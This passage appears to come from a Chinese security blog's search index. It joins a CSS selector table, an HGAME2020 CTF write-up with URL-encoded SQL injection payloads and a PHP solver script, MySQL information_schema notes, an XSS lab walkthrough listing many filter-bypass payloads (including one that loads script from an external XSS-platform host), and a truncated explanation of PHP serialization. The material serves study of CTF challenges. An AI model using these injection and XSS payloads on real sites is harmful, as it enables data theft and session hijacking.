选择所有使用target=&quot;-blank&quot;的元素 2 [attribute~=value] [title~=flower] 选择标题属性包含单词&quot;flower&quot;的所有元素 2 [attribute|=language] [lang|=en] 选择 lang 属性以 en 为开头的所有元素 2 :link a:link 选择所有未访问链接 1 :visited a:visited 选择所有访问过的链接 1 :active a:active 选择活动链接 1 :hover a:hover 选择鼠标在链接上面时 1 :focus input:focus 选择具有焦点的输入元素 2 :first-letter p:first-letter 选择每一个元素的第一个字母 1 :first-line p:first-line 选择每一个元素的第一行 1 :first-child p:first-child 指定只有当元素是其父级的第一个子级的样式。 2 :before p:before 在每个元素之前插入内容 2 :after p:after 在每个元素之后插入内容 2 :lang(language) p:lang(it) 选择一个lang属性的起始值=&quot;it&quot;的所有元素 2 element1~element2 p~ul 选择p元素之后的每一个ul元素 3 [attribute^=value] a[src^=“https”] 选择每一个src属性的值以&quot;https&quot;开头的元素 3 [attribute$=value] a[src$=“.pdf”] 选择每一个src属性的值以&quot;.pdf&quot;结尾的元素 3 [attribute*=value] a[src*=“runoob”] 选择每一个src属性的值包含子字符串&quot;runoob&quot;的元素 3 :first-of-type p:first-of-type 选择每个p元素是其父级的第一个p元素 3 :last-of-type p:last-of-type 选择每个p元素是其父级的最后一个p元素 3 :only-of-type p:only-of-type 选择每个p元素是其父级的唯一p元素 3 :only-child p:only-child 选择每个p元素是其父级的唯一子元素 3 :nth-child(n) p:nth-child(2) 选择每个p元素是其父级的第二个子元素 3 :nth-last-child(n) p:nth-last-child(2) 选择每个p元素的是其父级的第二个子元素，从最后一个子项计数 3 :nth-of-type(n) p:nth-of-type(2) 选择每个p元素是其父级的第二个p元素 3 :nth-last-of-type(n) p:nth-last-of-type(2) 选择每个p元素的是其父级的第二个p元素，从最后一个子项计数 3 :last-child p:last-child 选择每个p元素是其父级的最后一个子级。 3 :root :root 选择文档的根元素 3 :empty p:empty 选择每个没有任何子级的p元素（包括文本节点） 3 :target #news:target 选择当前活动的#news元素（包含该锚名称的点击的URL） 3 :enabled input:enabled 选择每一个已启用的输入元素 3 :disabled input:disabled 选择每一个禁用的输入元素 3 :checked input:checked 选择每个选中的输入元素 3 :not(selector) :not(p) 选择每个并非p元素的元素 3 ::selection ::selection 匹配元素中被用户选中或处于高亮状态的部分 3 :out-of-range :out-of-range 匹配值在指定区间之外的input元素 3 :in-range :in-range 匹配值在指定区间之内的input元素 3 :read-write :read-write 用于匹配可读及可写的元素 3 :read-only :read-only 用于匹配设置 “readonly”（只读） 属性的元素 3 :optional :optional 用于匹配可选的输入元素 3 :required :required 用于匹配设置了 “required” 属性的元素 3 :valid :valid 用于匹配输入值为合法的元素 3 :invalid :invalid 用于匹配输入值为非法的元素 3"},{"title":"HGAME2020-week2","date":"2020-02-02","updated":"2024-03-19","path":"2020/02/02/HGAME2020-week2/","text":"Cosmos的留言板 web的一道sql注入题，这名字起得还以为是xss 首先fuzz发现过滤了一次select,空格过滤了 select可以双写绕过，空格用注释绕过,还有要进行url编码 查数据库名 12&gt;&gt;&gt; urllib.parse.quote(&#x27;\\&#x27;/*1*/union/*1*/select/*1*/database();#&#x27;)&#x27;%27/%2A1%2A/union/%2A1%2A/select/%2A1%2A/database%28%29%3B%23&#x27; 查表 12&gt;&gt;&gt; urllib.parse.quote(&#x27;-1\\&#x27;/**/union/**/seselectlect/**/group_concat(TABLE_NAME)/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA=&quot;easysql&quot;;#&#x27;)&#x27;-1%27/%2A%2A/union/%2A%2A/seselectlect/%2A%2A/group_concat%28TABLE_NAME%29/%2A%2A/from/%2A%2A/information_schema.TABLES/%2A%2A/where/%2A%2A/TABLE_SCHEMA%3D%22easysql%22%3B%23&#x27; 查列 123&gt;&gt;&gt; urllib.parse.quote(&#x27;-1\\&#x27;/**/union/**/seselectlect/**/group_concat(COLUMN_NAME)/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_SCHEMA=&quot;easysql&quot;;#&#x27;)&#x27;-1%27/%2A%2A/union/%2A%2A/seselectlect/%2A%2A/group_concat%28COLUMN_NAME%29/%2A%2A/from/%2A%2A/information_schema.COLUMNS/%2A%2A/where/%2A%2A/TABLE_SCHEMA%3D%22easysql%22%3B%23&#x27; flag 12&gt;&gt;&gt; urllib.parse.quote(&#x27;-1\\&#x27;/**/union/**/seselectlect/**/fl4444444g/**/from/**/f1aggggggggggggg;#&#x27;)&#x27;-1%27/%2A%2A/union/%2A%2A/seselectlect/%2A%2A/fl4444444g/%2A%2A/from/%2A%2A/f1aggggggggggggg%3B%23&#x27; Cosmos的新语言 这些不是base64编码，看上面代码尝试访问mycode文件看到一段代码 12345678910111213function encrypt($str)&#123; $result = &#x27;&#x27;; for($i = 0; $i &lt; strlen($str); $i++)&#123; $result .= chr(ord($str[$i]) + 1); &#125; return $result;&#125;echo(strrev(base64_encode(base64_encode(strrev(encrypt(str_rot13(str_rot13(str_rot13(base64_encode(strrev($_SERVER[&#x27;token&#x27;])))))))))));if(@$_POST[&#x27;token&#x27;] === $_SERVER[&#x27;token&#x27;])&#123; echo($_SERVER[&#x27;flag&#x27;]);&#125; 这段代码就是加密代码了，但是这里有个坑。。 就是加密代码会变！。。。 解题脚本: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798&lt;?php/** * 发送post请求 * @param string $url 请求地址 * @param array $post_data post键值对数据 * @return string */function send_post($url, $post_data) &#123; $postdata = http_build_query($post_data); $options = array( &#x27;http&#x27; =&gt; array( &#x27;method&#x27; =&gt; &#x27;POST&#x27;, &#x27;header&#x27; =&gt; &#x27;Content-type:application/x-www-form-urlencoded&#x27;, &#x27;content&#x27; =&gt; $postdata, &#x27;timeout&#x27; =&gt; 15 * 60 // 超时时间（单位:s） ) ); $context = stream_context_create($options); $result = file_get_contents($url, false, $context); return $result;&#125;/** * 解密模块1 * @param string $str 待解密字符串 * @return string */function decrypt1($str)&#123; $deresult = &#x27;&#x27;; for($i = 0; $i &lt; strlen($str); $i++)&#123; $deresult .= chr(ord($str[$i]) - 1); &#125; return $deresult;&#125;/** * 获取网页内容 * @param string $url 网页url * @return string */function getHTML($url)&#123; // 获取网页内容 //echo $fh; // 正则过滤内容 //$pattern=&#x27;/code&gt;&lt;br&gt;(.*)&lt;br&gt;/s&#x27;; //小写s：将转义回车取消视为单行匹配 //preg_match($pattern,$fh,$match_result); // 返回的match_result 是一个数组 //print_r($match_result); //return $match_result[1]; $token=file_get_contents($url); $token=explode(&quot;\\n&quot;, $token); $token=substr($token[4], 0, -4); $token=html_entity_decode($token); return $token;&#125;/** * 解密模块 * @param string $url 网页网址 * */function Decrypt($url)&#123; $token=getHTML($url); // 获取编码 $op_function=file_get_contents($url . &#x27;/mycode&#x27;); $op_function=explode(&quot;\\n&quot;, $op_function)[8]; $op_function=explode(&#x27;(&#x27;, $op_function); $op_function=array_slice($op_function, 1, 10); foreach($op_function as $value)&#123; switch($value)&#123; case &#x27;base64_encode&#x27;: $token=base64_decode($token); break; case &#x27;str_rot13&#x27;: $token=str_rot13($token); break; case &#x27;encrypt&#x27;: $token=decrypt1($token); break; case &#x27;strrev&#x27;: $token=strrev($token); break; &#125; &#125; return $token;&#125;$url=&quot;http://6a72f6c03d.php.hgame.n3ko.co&quot;;$payload=Decrypt($url);$post_data = array( &#x27;token&#x27; =&gt; $payload); // 构造数据echo(send_post($url, $post_data)); //提交数据?&gt;"},{"title":"mysql_information_schema","date":"2020-02-02","updated":"2024-03-19","path":"2020/02/02/mysql-information-schema/","text":"information_schema 是一个信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。 information_schema数据库表说明: SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。 TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。 STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。 TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。 COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。 CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。 COLLATIONS表：提供了关于各字符集的对照信息。 COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。 TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。 KEY_COLUMN_USAGE表：描述了具有约束的键列。 ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。 VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。 TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111MariaDB [information_schema]&gt; show tables;+---------------------------------------+| Tables_in_information_schema |+---------------------------------------+| ALL_PLUGINS || APPLICABLE_ROLES || CHARACTER_SETS || CHECK_CONSTRAINTS || COLLATIONS || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS || COLUMN_PRIVILEGES || ENABLED_ROLES || ENGINES || EVENTS || FILES || GLOBAL_STATUS || GLOBAL_VARIABLES || KEY_CACHES || KEY_COLUMN_USAGE || PARAMETERS || PARTITIONS || PLUGINS || PROCESSLIST || PROFILING || REFERENTIAL_CONSTRAINTS || ROUTINES || SCHEMATA || SCHEMA_PRIVILEGES || SESSION_STATUS || SESSION_VARIABLES || STATISTICS || SYSTEM_VARIABLES || TABLES || TABLESPACES || TABLE_CONSTRAINTS || TABLE_PRIVILEGES || TRIGGERS || USER_PRIVILEGES || VIEWS || GEOMETRY_COLUMNS || SPATIAL_REF_SYS || CLIENT_STATISTICS || INDEX_STATISTICS || INNODB_SYS_DATAFILES || USER_STATISTICS || INNODB_SYS_TABLESTATS || INNODB_LOCKS || INNODB_MUTEXES || INNODB_CMPMEM || INNODB_CMP_PER_INDEX || INNODB_CMP || INNODB_FT_DELETED || INNODB_CMP_RESET || INNODB_LOCK_WAITS || TABLE_STATISTICS || INNODB_TABLESPACES_ENCRYPTION || INNODB_BUFFER_PAGE_LRU || INNODB_SYS_FIELDS || INNODB_CMPMEM_RESET || INNODB_SYS_COLUMNS || INNODB_FT_INDEX_TABLE || INNODB_CMP_PER_INDEX_RESET || user_variables || INNODB_FT_INDEX_CACHE || INNODB_SYS_FOREIGN_COLS || INNODB_FT_BEING_DELETED || INNODB_BUFFER_POOL_STATS || INNODB_TRX || INNODB_SYS_FOREIGN || INNODB_SYS_TABLES || INNODB_FT_DEFAULT_STOPWORD || INNODB_FT_CONFIG || INNODB_BUFFER_PAGE || INNODB_SYS_TABLESPACES || INNODB_METRICS || INNODB_SYS_INDEXES || INNODB_SYS_VIRTUAL || INNODB_TABLESPACES_SCRUBBING || INNODB_SYS_SEMAPHORE_WAITS |+---------------------------------------+76 rows in set (0.000 sec)MariaDB [information_schema]&gt; describe TABLES;+------------------+---------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+------------------+---------------------+------+-----+---------+-------+| TABLE_CATALOG | varchar(512) | NO | | | || TABLE_SCHEMA | varchar(64) | NO | | | || TABLE_NAME | varchar(64) | NO | | | || TABLE_TYPE | varchar(64) | NO | | | || ENGINE | varchar(64) | YES | | NULL | || VERSION | bigint(21) unsigned | YES | | NULL | || ROW_FORMAT | varchar(10) | YES | | NULL | || TABLE_ROWS | bigint(21) unsigned | YES | | NULL | || AVG_ROW_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || MAX_DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || INDEX_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_FREE | bigint(21) unsigned | YES | | NULL | || AUTO_INCREMENT | bigint(21) unsigned | YES | | NULL | || CREATE_TIME | datetime | YES | | NULL | || UPDATE_TIME | datetime | YES | | NULL | || CHECK_TIME | datetime | YES | | NULL | || TABLE_COLLATION | varchar(32) | YES | | NULL | || CHECKSUM | bigint(21) unsigned | YES | | NULL | || CREATE_OPTIONS | varchar(2048) | YES | | NULL | || TABLE_COMMENT | varchar(2048) | NO | | | || MAX_INDEX_LENGTH | bigint(21) unsigned | YES | | NULL | || TEMPORARY | varchar(1) | YES | | NULL | |+------------------+---------------------+------+-----+---------+-------+ 123456789101112131415161718192021222324252627MariaDB [information_schema]&gt; describe COLUMNS;+--------------------------+---------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+--------------------------+---------------------+------+-----+---------+-------+| TABLE_CATALOG | varchar(512) | NO | | | || TABLE_SCHEMA | varchar(64) | NO | | | || TABLE_NAME | varchar(64) | NO | | | || COLUMN_NAME | varchar(64) | NO | | | || ORDINAL_POSITION | bigint(21) unsigned | NO | | 0 | || COLUMN_DEFAULT | longtext | YES | | NULL | || IS_NULLABLE | varchar(3) | NO | | | || DATA_TYPE | varchar(64) | NO | | | || CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned | YES | | NULL | || CHARACTER_OCTET_LENGTH | bigint(21) unsigned | YES | | NULL | || NUMERIC_PRECISION | bigint(21) unsigned | YES | | NULL | || NUMERIC_SCALE | bigint(21) unsigned | YES | | NULL | || DATETIME_PRECISION | bigint(21) unsigned | YES | | NULL | || CHARACTER_SET_NAME | varchar(32) | YES | | NULL | || COLLATION_NAME | varchar(32) | YES | | NULL | || COLUMN_TYPE | longtext | NO | | | || COLUMN_KEY | varchar(3) | NO | | | || EXTRA | varchar(30) | NO | | | || PRIVILEGES | varchar(80) | NO | | | || COLUMN_COMMENT | varchar(1024) | NO | | | || IS_GENERATED | varchar(6) | NO | | | || GENERATION_EXPRESSION | longtext | YES | | NULL | |+--------------------------+---------------------+------+-----+---------+-------+ 1234567891011121314151617181920212223242526MariaDB [information_schema]&gt; select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;test&#x27;;+------------+| TABLE_NAME |+------------+| flag || student || people || php |+------------+4 rows in set (0.000 sec)MariaDB [information_schema]&gt; select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;test&#x27;;+-------------+| COLUMN_NAME |+-------------+| flag || id || name || score || pass || name || age || user || pw |+-------------+"},{"title":"xss娱乐靶场","date":"2020-01-31","updated":"2024-03-19","path":"2020/01/31/xss娱乐靶场/","text":"利用script标签执行js 1&lt;script&gt;alert(1)&lt;/script&gt; 字符串用&quot; ’ 包裹都行 采用on事件方法 on事件不用单引号或双引号也可以触发，但是必须闭合标签内的引号 12&lt;onclick=alert(1)&gt; =&gt;点击就会触发&lt;onmouseover=alert(1)&gt; =&gt;鼠标移动触发 很多HTML标记中的属性都支持javascript:[code]伪协议的形式，这就给了注入XSS可乘之机,例如： 1&lt;img src = &quot;javascript:alert(‘xss‘);&quot;&gt; 这里即便对传入的参数过滤了&lt;&gt;,XSS还是能发生(前提是该标签属性需要引用文件) 采用a标签来做到xss 1&lt;a href=&quot;javascript:alert(1)&quot; &gt; 假设过滤函数进一步又过滤了javascript等敏感字符串，只需对javascript进行小小的操作即可绕过，例如： 1&lt;img src= &quot;java script:alert(‘xss‘);&quot; width=100&gt; 这里之所以能成功绕过，其实还得益于JS自身的性质：Javascript通常以分号结尾，如果解析引擎能确定一个语句时完整的，且行尾有换行符，则分号可省略 而如果不是完整的语句，javascript则会继续处理，直到语句完整结束或分号。 像 1&lt;img src= &quot;javascript: alert(/xss/); width=100&gt; 同样能绕过 exif xss 可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。 将XSS写到Exif里（PowerExif）exif是PHP拓展，如果要用exif_read_data函数要记得开启拓展。 一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的exif元数据被修改为xss payload,成功利用弹窗 具体实现使用kali下的exiftool工具 命令如下： exiftool -FIELD=XSS FILE exiftool -Artist=’ “&gt;’ brute.jpeg flash xss 第六关 第六关script替换成scr_ipt, on替换成o_n,但是&lt;/script&gt;没有替换，所以尝试大小写替换。 第七关 尝试javascript:alert(1)&quot; &gt; 发现script被过滤 尝试双写发现可以哎，说明只用了一次过滤，可以绕过 所以构造可以触发的xss &quot;/&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt; 12345 ![image-20200131224652113](xss娱乐靶场/image-20200131224652113.png)### 第八关 Javascript：伪协议后面可以使用URL编码。 如：click me可成功执行弹窗。 可用img就不行: 因为href属性会跳转到其中的URL，而会进行URL解码，onerror属性只会执行JS,不跳转同时后面的url编码可以再做一次entity(HTML实体)编码： click me 123456789101112131415&quot;script&quot;转换为&quot;scr_ipt&quot;，&quot;on&quot;转换为&quot;o_n&quot;，&quot;src&quot;转换为&quot;sr_c&quot;，&quot;data&quot;转换为&quot;da_ta&quot;，&quot;href&quot;转换为&quot;hr_ef&quot;，&#x27;&quot;&#x27;转换为&#x27;&amp;quot&#x27;，大小写过滤并被编码，尖括号&gt;&lt;，单引号&#x27;，%，#，&amp;符号没有被过滤，输出点在a标签内，href属性中，属性里的双引号被转换成HTML实体，无法截断属性，这里可以使用伪协议绕过javascript:alert，由于script关键字被过滤，javascript会被替换成javasc_ript，使用&amp;#x72来代替r,伪协议后面可以使用URL编码进行编码。```htmlPayload：javascri&amp;#x70;&amp;#x74;:alert(8)javasc&amp;#x72;&amp;#x69;pt:%61lert(8)javasc&amp;#x72;&amp;#x69;pt:%61lert`1`javasc&amp;#x0072;ipt:alert`1`javasc%09ript:alert(1) 第九关 和上一关差不多只是加了一个url检测,如果url没有http则替换成非法字符串，用注释绕过 第十关 发现三个隐藏输入框哦 其他可行的payload: 123Keyword=aaa&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=&quot;alert(10)Keyword=aaa&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=alert｀1｀ 第十一关 referer字段中的内容会被填入这个隐藏按钮 1payload:Referer:&quot; type=&quot;text&quot; onclick=&quot;alert(1) 第十二关 很明显这是头部User-Agent字段 User-Agent: &quot; type=“text” onclick=&quot;alert(1) 第十三关 cookie的字段 不说了 第十四关 exif xss 查看源码通过iframe标签引入了一个http://exofvoewer.org, 结合乌云爆出的 漏洞，上传一个含有xss代码的图片触发xss。 exif xss 下面内容来自 第十五关 什么？让我自己走出去。这里看来只能在url里面操作 发现src参数，查看源码发现把参数拼接到了最后一行输出，那这里应该是突破口了 这里估计使用ng-include，这个属性可以包含文件，默认是同域名的文件 那我们包含level1.php加上参数即可 payload:level15.php?src=‘level1.php?name=’ 因为这里要访问上面的angular.min.js这个js文件，才能进行包含，虚拟环境里面无法访问那个js，因为需要fanqiang才能访问，根本没法实现，所以我找了外网的一样的xss挑战进行测试 成功包含level1弹窗 解 第十六关 过滤空格，script，/，使用%0d %0a做分割符 payload： 1234/level16.php?keyword=&lt;img%0Dsrc=1%0Donerror=alert(1)&gt;http://127.0.0.1/xss//level16.php?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;http://127.0.0.1/xss//level16.php?keyword=&lt;img%0asrc=x%0donError=alert(&#x27;xss&#x27;)&gt;http://127.0.0.1/xss//level16.php?keyword=&lt;iframe%0asrc=x%0donmouseover=alert`1`&gt;&lt;/iframe&gt; 总结 xss绕过方法 大小写绕过 &lt;Script&gt;alert(1)&lt;/Script&gt; 双写绕过 &lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt; 替换绕过 1234过滤 alert 用prompt，confirm，top[&#x27;alert&#x27;](1)代替绕过过滤() 用``代替绕过过滤空格 用%0a（换行符）,%0d（回车符），/**/代替绕过小写转大写情况下 字符ſ大写后为S（ſ不等于s） %00截断绕过 &lt;a href=javascr%00ipt:alert(1)&gt;xss&lt;/a&gt; 编码绕过 123456789实体编码javascrip&amp;#x74;:alert(1) 十六进制javascrip&amp;#116;:alert(1) 十进制unicode编码javascripu0074:alert(1) url编码javascrip%74:alert(1) fromCharCode方法绕过 12String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41)) javascript伪协议绕过 无法闭合双引号的情况下，就无法使用onclick等事件，只能伪协议绕过，或者调用外部js 换行绕过正则匹配 12onmousedown=alert(1) 注释符 12345678// 单行注释&lt;!-- --!&gt; 注释多行内容&lt;!-- --&gt; 注释多行内容&lt;-- --&gt; 注释多行内容&lt;-- --！&gt; 注释多行内容--&gt; 单行注释后面内容/* */ 多行注释有时还可以利用浏览器的容错性，不需要注释 闭合标签空格绕过 &lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt; @符号绕过url限制 例如：https://www.segmentfault.com@xss.haozi.me/j.js 其实访问的是@后面的内容 &quot;)逃逸函数后接分号 例： 1&quot;);alert(1)// 绕过转义限制 例： 12&quot;)alert(1) // xss paylaod形式 12345678&lt;script&gt;alert(1)&lt;/script&gt;&lt;script src=&quot;http://xsspt.com/vA4t1W?1542101296&quot;&gt;&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;&lt;svg onload=alert(1)&gt;&lt;input type=&quot;text&quot; name=&quot;test&quot; onclick=alert(1)&gt;&lt;iframe src=&quot;javascript:alert(/xss/)&quot;&gt;xss&lt;/iframe&gt;&lt;iframe srcdoc=&quot;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&quot;&gt; 【巨人肩膀上的矮子】XSS挑战之旅—游戏通关攻略（更新至18关） XSS绕过实战练习 【干货分享】XSS攻击进阶篇——那些年我们看不懂的XSS"},{"title":"php序列化","date":"2020-01-31","updated":"2024-03-19","path":"2020/01/31/php序列化/","text":"2019CISCN web题赛-JustSoSo 其中反序列化用到了引用来绕过md5 PHP 序列化（serialize）格式详解 前言 概述 NULL 和标量类型的序列化 简单复合类型的序列化 嵌套复合类型的序列化 自定义对象序列化 Unicode 字符串的序列化 参考文献 1．前言 PHP （从 PHP 3.05 开始）为保存对象提供了一组序列化和反序列化的函数：serialize、unserialize。 2．概述 PHP 序列化后的内容是简单的文本格式，但是对字母大小写和空白（空格、回车、换行等）敏感，而且字符串是按照字节（或者说是 8 位的字符）计算的，因此，更合适的说法是 PHP 序列化后的内容是字节流格式。因此用其他语言实现时，如果所实现的语言中的字符串不是字节储存格式，而是 Unicode 储存格式的话，序列化后的内容不适合保存为字符串，而应保存为字节流对象或者字节数组，否则在与 PHP 进行数据交换时会产生错误。 PHP 对不同类型的数据用不同的字母进行标示，Yahoo 开发网站提供的 Using Serialized PHP with Yahoo! Web Services 一文中给出所有的字母标示及其含义： a - array b - boolean d - double i - integer o - common object r - reference s - string C - custom object O - class N - null R - pointer reference U - unicode string N 表示的是 NULL，而 b、d、i、s 表示的是四种标量类型，目前其它语言所实现的 PHP 序列化程序基本上都实现了对这些类型的序列化和反序列化，不过有一些实现中对 s （字符串）的实现存在问题。 a、O 属于最常用的复合类型，大部分其他语言的实现都很好的实现了对 a 的序列化和反序列化，但对 O 只实现了 PHP4 中对象序列化格式，而没有提供对 PHP 5 中扩展的对象序列化格式的支持。 r、R 分别表示对象引用和指针引用，这两个也比较有用，在序列化比较复杂的数组和对象时就会产生带有这两个标示的数据，后面我们将详细讲解这两个标示，目前这两个标示尚没有发现有其他语言的实现。 C 是 PHP5 中引入的，它表示自定义的对象序列化方式，尽管这对于其它语言来说是没有必要实现的，因为很少会用到它，但是后面还是会对它进行详细讲解的。 U 是 PHP6 中才引入的，它表示 Unicode 编码的字符串。因为 PHP6 中提供了 Unicode 方式保存字符串的能力，因此它提供了这种序列化字符串的格式，不过这个类型 PHP5、PHP4 都不支持，而这两个版本目前是主流，因此在其它语言实现该类型时，不推荐用它来进行序列化，不过可以实现它的反序列化过程。在后面我也会对它的格式进行说 明。 最后还有一个 o ,这个标示在 PHP3 中被引入用来序列化对象，但是到了 PHP4 以后就被 O 取代了。在 PHP3 的源代码中可以看到对 o 的序列化和反序列化与数组 a 基本上是一样的。但是在 PHP4、PHP5 和 PHP6 的源代码中序列化部分里都找不到它的影子，但是在这几个版本的反序列化程序源代码中却都有对它的处理。 补充 最近的 PHP CVS 版本中，序列化的方式有所变化，基本类型的序列化仍然保持原来的格式，只是对 Unicode 支持上，有了新的进展。另外，对普通字符串的序列化也分成了 2 种。一种是 non-escaped 字符串，也就是我们上面说的那个小写 s 标识的字符串；另一种是 escaped 字符串，这种字符串格式用大写 S 标识。所以上面那个表现在应该改为： a - array b - boolean d - double i - integer o - common object r - reference s - non-escaped binary string S - escaped binary string C - custom object O - class N - null R - pointer reference U - unicode string 3．NULL 和标量类型的序列化 NULL 和标量类型的序列化是最简单的，也是构成符合类型序列化的基础。这部分内容相信许多 PHP 开发者都已经熟知。如果您感觉已经掌握了这部分内容，可以直接跳过这一章。 3.1．NULL 的序列化 在 PHP 中，NULL 被序列化为： N; 3.2．boolean 型数据的序列化 boolean 型数据被序列化为： 1b:&lt;digit&gt;; 其中 &lt;digit&gt; 为 0 或 1，当 boolean 型数据为 false 时，&lt;digit&gt; 为 0，否则为 1。 3.3．integer 型数据的序列化 integer 型数据（整数）被序列化为： i:&lt;number&gt;; 其中 &lt;number&gt; 为一个整型数，范围为：-2147483648 到 2147483647。数字前可以有正负号，如果被序列化的数字超过这个范围，则会被序列化为浮点数类型而不是整型。如果序列化后的数字超过这个范围 （PHP 本身序列化时不会发生这个问题），则反序列化时，将不会返回期望的数值。 3.4．double 型数据的序列化 double 型数据（浮点数）被序列化为： d:&lt;number&gt;; 其中 &lt;number&gt; 为一个浮点数，其范围与 PHP 中浮点数的范围一样。可以表示成整数形式、浮点数形式和科学技术法形式。如果序列化无穷大数，则 &lt;number&gt; 为 INF，如果序列化负无穷大，则 &lt;number&gt; 为 -INF。序列化后的数字范围超过 PHP 能表示的最大值，则反序列化时返回无穷大（INF），如果序列化后的数字范围超过 PHP 所能表示的最小精度，则反序列化时返回 0。当浮点数为非数时，被序列化为 NAN，NAN 反序列化时返回 0。但其它语言可以将 NAN 反序列化为相应语言所支持的 NaN 表示。 3.5．string 型数据的序列化 string 型数据（字符串）被序列化为： s:&lt;length&gt;:“&lt;value&gt;”; 其中 &lt;length&gt; 是 &lt;value&gt; 的长度，&lt;length&gt; 是非负整数，数字前可以带有正号（+）。&lt;value&gt; 为字符串值，这里的每个字符都是单字节字符，其范围与 ASCII 码的 0 - 255 的字符相对应。每个字符都表示原字符含义，没有转义字符，&lt;value&gt; 两边的引号（“”）是必须的，但不计算在 &lt;length&gt; 当中。这里的 &lt;value&gt; 相当于一个字节流，而 &lt;length&gt; 是这个字节流的字节个数。 补充 在 PHP5 最新的 CVS 中（也就是将来要发布的 PHP6），上面对于 string 型数据的序列化方式已经被下面这种所取代，但是 PHP6 仍然支持上面那种序列化方式的反序列化。 新的序列化方式叫做 escaped binary string 方式，这是相对与上面那种 non-escaped binary string 方式来说的： string 型数据（字符串）新的序列化格式为： S:&lt;length&gt;:“&lt;value&gt;”; 其中 &lt;length&gt; 是源字符串的长度，而非 &lt;value&gt; 的长度。&lt;length&gt; 是非负整数，数字前可以带有正号（+）。&lt;value&gt; 为经过转义之后的字符串。 它的转义编码很简单，对于 ASCII 码小于 128 的字符（但不包括 \\），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \\ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \\ 作为开头，后面两个字节分别是这个字符的 16 进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1 位作为第二个字节。依次编码下来，得到的就是 的内容了。 4．简单复合类型的序列化 PHP 中的复合类型有数组（array）和对象（object）两种，本章主要介绍在简单情况下这两种类型数据的序列化格式。关于嵌套定义的复合类型和自定义序列化方式的对象的序列化格式将在后面的章节详细讨论。 4.1．数组的序列化 数组（array）通常被序列化为： a:&lt;n&gt;:{&lt;key 1&gt;&lt;value 1&gt;&lt;key 2&gt;&lt;value 2&gt;…&lt;key n&gt;&lt;value n&gt;} 其中&lt;n&gt; 表示数组元素的个数，&lt;key 1&gt;、&lt;key 2&gt;……&lt;key n&gt; 表示数组下标，&lt;value 1&gt;、&lt;value 2&gt;……&lt;value n&gt; 表示与下标相对应的数组元素的值。下标的类型只能是整型或者字符串型（包括后面那种 Unicode 字符串型），序列化后的格式跟整型和字符串型数据序列化后的格式相同。 数组元素值可以是任意类型，其序列化后的格式与其所对应的类型序列化后的格式相同。 4.2．对象的序列化 对象（object）通常被序列化为： O:&lt;length&gt;:“&lt;class name&gt;”:&lt;n&gt;:{&lt;field name 1&gt;&lt;field value 1&gt;&lt;field name 2&gt;&lt;field value 2&gt;…&lt;field name n&gt;&lt;field value n&gt;} 其中&lt;length&gt; 表示对象的类名 &lt;class name&gt; 的字符串长度。&lt;n&gt; 